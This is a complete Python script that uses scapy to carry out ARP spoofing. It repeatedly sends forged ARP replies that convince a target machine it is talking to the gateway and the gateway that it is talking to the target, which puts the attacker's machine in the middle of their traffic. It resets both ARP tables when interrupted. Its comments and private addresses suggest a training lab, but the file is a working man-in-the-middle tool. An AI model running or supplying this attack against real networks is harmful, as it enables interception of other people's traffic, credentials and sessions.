#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip) # ARP request asking for all IPs on NW
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # set desitination mac to broadcast mac, for ARP req ^
    arp_request_broadcast = broadcast/arp_request # scapy syntax to combine two ARP packet
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # send/receive packet created above ^

    return answered_list[0][1].hwsrc

def restore(destination_ip, source_ip): # func to restore ARP table to previous state
    destination_mac = get_mac(destination_ip) # get mac addy from destination ip addy
    source_mac = get_mac(source_ip) # get mac addy from source ip
    packet = scapy.ARP(op=2, pdst= destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)



def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # op=2 creates an ARP response instead of a request, dest IP (target), dest mac, changed source IP to match routers
    scapy.send(packet, verbose=False)

target_ip = "10.0.2.15"
gateway_ip = "10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip) # Telling target comp you are the router
        spoof(gateway_ip, target_ip) # Telling router you are target comp
        sent_packets_count += 2
        print("\r[+] Packets sent:" + str(sent_packets_count), end="")
        time.sleep(2) # pause 2 sec before sending next ARP packet
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ...... Resetting ARP tables ..... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
